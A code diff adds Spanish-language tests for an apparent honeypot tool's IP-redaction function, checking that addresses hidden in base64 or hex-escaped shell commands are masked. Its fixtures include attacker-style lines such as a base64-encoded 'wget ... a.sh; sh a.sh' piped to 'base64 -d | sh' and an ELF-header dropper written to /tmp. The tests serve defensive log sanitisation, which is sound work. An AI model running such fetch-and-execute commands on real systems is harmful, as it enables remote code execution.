@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+import base64
+
 from honeyml.api import privacidad
 
 
@@ -16,6 +18,36 @@ def test_tapa_una_direccion_pegada_a_letras_o_guiones_bajos() -> None:
 
 def test_no_tapa_a_medias_un_numero_con_mas_cifras() -> None:
     for texto in ("1234.5.6.7", "1.2.3.4567"):
+        assert privacidad.sin_direcciones(texto) == texto
+
+
+def _bloque_base64(comando: str) -> str:
+    return comando.split()[1]
+
+
+def test_tapa_una_direccion_escondida_en_base64_sin_cambiar_el_resto() -> None:
+    oculto = base64.b64encode(b"cd /tmp; wget http://198.51.100.50/a.sh; sh a.sh").decode()
+    tapado = privacidad.sin_direcciones(f"echo {oculto} | base64 -d | sh")
+    assert tapado.startswith("echo ") and tapado.endswith(" | base64 -d | sh")
+    decodificado = base64.b64decode(_bloque_base64(tapado)).decode()
+    assert decodificado == "cd /tmp; wget http://x.x.x.x/a.sh; sh a.sh"
+
+
+def test_tapa_una_direccion_escondida_en_escapes_hexadecimales() -> None:
+    oculto = "".join(f"\\x{b:02x}" for b in b"198.51.100.9")
+    tapado = privacidad.sin_direcciones(f'printf "{oculto}" > /tmp/c')
+    assert tapado == 'printf "' + "".join(f"\\x{b:02x}" for b in b"x.x.x.x") + '" > /tmp/c'
+
+
+def test_un_bloque_codificado_sin_direccion_no_se_toca() -> None:
+    sin_direccion = base64.b64encode(b"uname -a; cat /proc/cpuinfo").decode()
+    elf = "".join(f"\\x{b:02x}" for b in b"\x7fELF\x02\x01\x01\x00")
+    for texto in (
+        f"echo {sin_direccion} | base64 -d | sh",
+        f"echo -ne '{elf}' > /tmp/b",
+        "sha256sum 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+        "cd /usr/local/share/aplicaciones/configuracion",
+    ):
         assert privacidad.sin_direcciones(texto) == texto
 
 
